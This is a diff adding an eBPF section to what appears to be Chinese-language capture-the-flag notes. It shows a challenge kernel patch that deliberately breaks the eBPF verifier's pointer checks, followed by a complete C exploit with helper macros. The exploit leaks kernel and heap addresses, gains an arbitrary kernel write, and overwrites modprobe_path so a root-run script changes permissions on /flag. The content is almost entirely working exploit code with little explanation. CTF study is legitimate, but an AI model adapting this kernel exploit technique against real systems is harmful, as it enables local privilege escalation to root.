@@ -477,3 +477,410 @@ print(flag)
 - [github search](https://docs.github.com/en/github/searching-for-information-on-github/searching-on-github/searching-issues-and-pull-requests) 增加搜尋速度
   - `unsound` / `bug` tag 與安全/功能相關
 
+
+
+### ebpf
+
+kernel version
+
+```
+Linux (none) 5.12.2 #1 SMP Tue Jun 22 23:15:48 UTC 2021 x86_64 GNU/Linux
+```
+
+patch1:
+
+```diff
+--- linux-5.12.2/include/linux/bpf_verifier.h	2021-05-07 03:53:26.000000000 -0700
++++ linux-5.12.2-modified/include/linux/bpf_verifier.h	2021-06-15 20:06:53.019787853 -0700
+@@ -156,6 +156,7 @@
+ 	enum bpf_reg_liveness live;
+ 	/* if (!precise && SCALAR_VALUE) min/max/tnum don't affect safety */
+ 	bool precise;
++   bool auth_map;
+ };
+ 
+ enum bpf_stack_slot_type {
+```
+
+patch2:
+
+```diff
+--- linux-5.12.2/kernel/bpf/verifier.c	2021-05-07 03:53:26.000000000 -0700
++++ linux-5.12.2-modified/kernel/bpf/verifier.c	2021-06-15 20:06:54.495796355 -0700
+@@ -2923,6 +2924,7 @@
+ 				   int off, int size, u32 mem_size,
+ 				   bool zero_size_allowed)
+ {
++  
+ 	struct bpf_verifier_state *vstate = env->cur_state;
+ 	struct bpf_func_state *state = vstate->frame[vstate->curframe];
+ 	struct bpf_reg_state *reg = &state->regs[regno];
+@@ -6326,13 +6330,19 @@
+ 				memset(&dst_reg->raw, 0, sizeof(dst_reg->raw));
+ 		}
+ 		break;
+-	case BPF_AND:
+-	case BPF_OR:
+ 	case BPF_XOR:
+-		/* bitwise ops on pointers are troublesome, prohibit. */
+-		verbose(env, "R%d bitwise operator %s on pointer prohibited\n",
+-			dst, bpf_alu_string[opcode >> 4]);
+-		return -EACCES;
++                // As long as we downgrade the result to scalar it is safe.
++                if (dst_reg->type == PTR_TO_MAP_VALUE) {
++                        dst_reg->type = SCALAR_VALUE;
++                        dst_reg->auth_map = true;
++                        break;
++                }
++   case BPF_AND:
++	case BPF_OR:
++	  	/* bitwise ops on pointers are troublesome, prohibit. */
++	  	verbose(env, "R%d bitwise operator %s on pointer prohibited\n",
++	  		dst, bpf_alu_string[opcode >> 4]);
++	  	return -EACCES;
+ 	default:
+ 		/* other operators (e.g. MUL,LSH) produce non-pointer results */
+ 		verbose(env, "R%d pointer arithmetic with %s operator prohibited\n",
+@@ -7037,6 +7047,13 @@
+ 		scalar_min_max_or(dst_reg, &src_reg);
+ 		break;
+ 	case BPF_XOR:
++                /* Restore the pointer type.*/
++                if (dst_reg->auth_map) {
++                         dst_reg->auth_map = false;
++                         dst_reg->type = PTR_TO_MAP_VALUE;
++                         break;
++                }
++
+ 		dst_reg->var_off = tnum_xor(dst_reg->var_off, src_reg.var_off);
+ 		scalar32_min_max_xor(dst_reg, &src_reg);
+ 		scalar_min_max_xor(dst_reg, &src_reg);
+```
+
+看似複雜，不過簡化後可以看成:
+
+```diff
+static int adjust_ptr_min_max_vals(...)
+{
+...
+case BPF_XOR:
+-		/* bitwise ops on pointers are troublesome, prohibit. */
+-		verbose(env, "R%d bitwise operator %s on pointer prohibited\n",
+-			dst, bpf_alu_string[opcode >> 4]);
+-		return -EACCES;
++                if (dst_reg->type == PTR_TO_MAP_VALUE) {
++                        dst_reg->type = SCALAR_VALUE;
++                        dst_reg->auth_map = true;
++                        break;
++                }
+
+static int adjust_scalar_min_max_vals(...)
+{
+	case BPF_XOR:
++                /* Restore the pointer type.*/
++                if (dst_reg->auth_map) {
++                         dst_reg->auth_map = false;
++                         dst_reg->type = PTR_TO_MAP_VALUE;
++                         break;
++                }
++
+...
+```
+
+
+
+Exploit:
+
+```c
+#include <linux/bpf.h>
+#include <sys/socket.h>
+#include <stdio.h>
+#include <assert.h>
+#include "bpf_insn.h"
+
+struct bpf_insn insns[] =
+{
+    BPF_GET_MAP(3, 0),
+
+    // ------------- 0. leak kern -------------
+    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0), // r2 = r0[0]
+    BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0, 11),
+
+    BPF_MOV64_REG(BPF_REG_1, BPF_REG_0), // r1 = r0
+    BPF_MOV64_REG(BPF_REG_2, BPF_REG_0), // r2 = r0
+    
+    BPF_ALU64_IMM(BPF_XOR, BPF_REG_0, 0), // r0 to scalar
+    BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, -0x110), // r0 -= 0x110
+    
+    BPF_ALU64_REG(BPF_XOR, BPF_REG_0, BPF_REG_1), // r0 ^= r1
+    BPF_ALU64_REG(BPF_XOR, BPF_REG_1, BPF_REG_0), // r1 ^= r0, r1 to scalar
+    BPF_ALU64_IMM(BPF_XOR, BPF_REG_1, 0), // r1 to ptr
+
+    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_1, 0), // r3 = r1[0]
+    BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0), // r2[0] = r3
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+
+    // ------------- 1. overwrite modprobe_path -------------
+    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0), // r2 = r0[0]
+    BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 1, 12),
+
+    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0x8), // r2 = r0[1]
+    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_0, 0x10), // r3 = r0[2]
+
+    /* for r0 ^= r2 */
+    BPF_MOV64_IMM(BPF_REG_4, 0x1),
+    BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 48),
+    BPF_JMP_REG(BPF_JLE, BPF_REG_2, BPF_REG_4, 2),
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+    BPF_ALU64_REG(BPF_XOR, BPF_REG_0, BPF_REG_2), // r0 ^= r2
+
+    BPF_ALU64_IMM(BPF_XOR, BPF_REG_0, 0),
+    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_3, 0), // *(r0 + 0) = r3
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+
+    // ------------- 2. leak heap -------------
+    BPF_MOV64_IMM(BPF_REG_1, 0), // r1 = 0
+    BPF_ALU64_REG(BPF_XOR, BPF_REG_1, BPF_REG_0), // r1 ^= r0
+    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 0), // *(r0 + 0) = r1
+    BPF_MOV64_IMM(BPF_REG_0, 0),
+    BPF_EXIT_INSN(),
+};
+
+int map_fd, prog_fd;
+int socks[2];
+const int key = 0;
+uint64_t kern, heap;
+char *mapbuf;
+uint64_t *mapbuf_64;
+
+void setup_modprobe_path()
+{
+    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /tmp/x");
+    system("chmod +x /tmp/x");
+    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/pwn");
+    system("chmod +x /tmp/pwn");
+}
+
+void init_proc()
+{
+    setup_modprobe_path();
+    setvbuf(stdout, 0, 2, 0);
+    setvbuf(stderr, 0, 2, 0);
+    map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x100, 1);
+    prog_fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insns,
+                            sizeof(insns) / sizeof(insns[0]), "GPL");
+    printf("map_fd: %d\nprog_fd: %d\n", map_fd, prog_fd);
+    socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);
+    assert(setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF,
+                        &prog_fd, sizeof(prog_fd)) == 0);
+    mapbuf = (char *) malloc(0x100);
+    mapbuf_64 = (uint64_t *) mapbuf;
+    memset(mapbuf, 0, 0x100);
+}
+
+void trigger_hook()
+{
+    char buf[64] = {0};
+    puts("trigger hook ...");
+    syscall(__NR_write, socks[1], buf, sizeof(buf));
+}
+
+void leak_kern()
+{
+    mapbuf_64[0] = 0;
+    bpf_update_elem(map_fd, &key, mapbuf, 0);
+    trigger_hook();
+    bpf_lookup_elem(map_fd, &key, mapbuf);
+    kern = mapbuf_64[0];
+    _log("kern", kern);
+}
+
+void leak_heap()
+{
+    mapbuf_64[0] = 2;
+    bpf_update_elem(map_fd, &key, mapbuf, 0);
+    trigger_hook();
+    bpf_lookup_elem(map_fd, &key, mapbuf);
+    heap = mapbuf_64[0];
+    _log("heap (map_addr)", heap);
+}
+
+void overwrite_modprobe_path()
+{
+    uint64_t modprobe_path = kern + 0x6368c0;
+    uint64_t xor_val = modprobe_path ^ heap;
+
+    mapbuf_64[0] = 1;
+    mapbuf_64[1] = xor_val;
+    mapbuf_64[2] = 0x782f706d742f; // /tmp/x
+    _log("modprobe_path", modprobe_path);
+    _log("xor_val", mapbuf_64[1]);
+
+    bpf_update_elem(map_fd, &key, mapbuf, 0);
+    trigger_hook();
+    bpf_lookup_elem(map_fd, &key, mapbuf);
+    _log("overwrite modprobe_path done", 0);
+}
+
+void exploit()
+{
+    leak_kern();
+    leak_heap();
+    overwrite_modprobe_path();
+}
+
+int main()
+{
+    init_proc();
+    exploit();
+    free(mapbuf);
+
+    return 0;
+}
+```
+
+bpf_insn.h from [here](https://github.com/torvalds/linux/blob/master/samples/bpf/bpf_insn.h), and I append some helper functions / macros to it:
+
+```c
+#define SO_ATTACH_BPF 50
+#define LOG_BUF_SIZE 65536
+
+char bpf_log_buf[LOG_BUF_SIZE];
+struct bpf_insn;
+
+#define BPF_CALL_FUNC(FUNC) \
+	((struct bpf_insn) {                                    \
+		.code = BPF_JMP | BPF_CALL | BPF_K,				\
+		.dst_reg = 0,	\
+		.src_reg = 0,	\
+		.off = 0, \
+		.imm = FUNC })
+
+/**
+ * r1 = fd
+ * r2 = idx
+ * [r10-4] = idx
+ * r2 = r10
+ * r2 -= 4 // idx
+ * map_lookup_elem(r1, r2)
+ */
+#define BPF_GET_MAP(fd, idx) \
+        BPF_LD_MAP_FD(BPF_REG_1, fd), \
+        BPF_MOV64_IMM(BPF_REG_2, idx), \
+        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_2, -4), \
+        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), \
+        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), \
+        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), \
+        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), \
+		BPF_EXIT_INSN()
+
+void _log(const char *s, unsigned long val)
+{
+	char buf[128];
+	if (val) {
+		sprintf(buf, "[*] %s : 0x%016lx", s, val);
+	} else {
+		sprintf(buf, "[*] %s", s);
+	}
+	puts(buf);
+}
+
+void show(uint64_t *ptr, int num)
+{
+    puts("----------- show -----------");
+    for (int i = 0 ; i < num; i++)
+        printf("%d:  0x%016lx \n", i, ptr[i]);
+    puts("----------- end -----------\n");
+}
+
+int bpf(enum bpf_cmd cmd, union bpf_attr *attr, unsigned int size)
+{
+    return syscall(__NR_bpf, cmd, attr, size);
+}
+
+/* REF: https://man7.org/linux/man-pages/man2/bpf.2.html */
+
+/**
+ * The BPF_MAP_CREATE command creates a new map, returning a
+ * new file descriptor that refers to the map
+ */
+static inline int
+bpf_create_map(enum bpf_map_type map_type,
+                unsigned int key_size,
+                unsigned int value_size,
+                unsigned int max_entries)
+{
+    union bpf_attr attr = {
+        .map_type    = map_type,
+        .key_size    = key_size,
+        .value_size  = value_size,
+        .max_entries = max_entries
+    };
+	
+    return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
+}
+
+/**
+ * The BPF_PROG_LOAD command is used to load an eBPF program into
+ * the kernel.  The return value for this command is a new file
+ * descriptor associated with this eBPF program
+ */
+static inline int
+bpf_prog_load(enum bpf_prog_type type,
+                const struct bpf_insn *insns, int insn_cnt,
+                const char *license)
+{
+    union bpf_attr attr = {
+        .prog_type = type,
+        .insns     = (uint64_t) insns,
+        .insn_cnt  = insn_cnt,
+        .license   = (uint64_t) license,
+        .log_buf   = (uint64_t) bpf_log_buf,
+        .log_size  = LOG_BUF_SIZE,
+        .log_level = 1,
+        .kern_version = 0,
+    };
+    bpf_log_buf[0] = 0;
+    return bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
+}
+
+/**
+ * The BPF_MAP_UPDATE_ELEM command creates or updates an
+ * element with a given key/value in the map referred to by
+ * the file descriptor fd
+ */
+static inline int
+bpf_update_elem(int fd, const void *key, const void *value,
+                uint64_t flags)
+{
+    union bpf_attr attr = {
+        .map_fd = fd,
+        .key    = (uint64_t) key,
+        .value  = (uint64_t) value,
+        .flags  = flags,
+    };
+
+    return bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
+}
+
+/**
+ * The BPF_MAP_LOOKUP_ELEM command looks up an element with a
+ * given key in the map referred to by the file descriptor
+ * fd.
+ */
+static inline int
+bpf_lookup_elem(int fd, const void *key, void *value)
+{
+    union bpf_attr attr = {
+        .map_fd = fd,
+        .key    = (uint64_t) key,
+        .value  = (uint64_t) value,
+    };
+
+    return bpf(BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
+}
+```
+
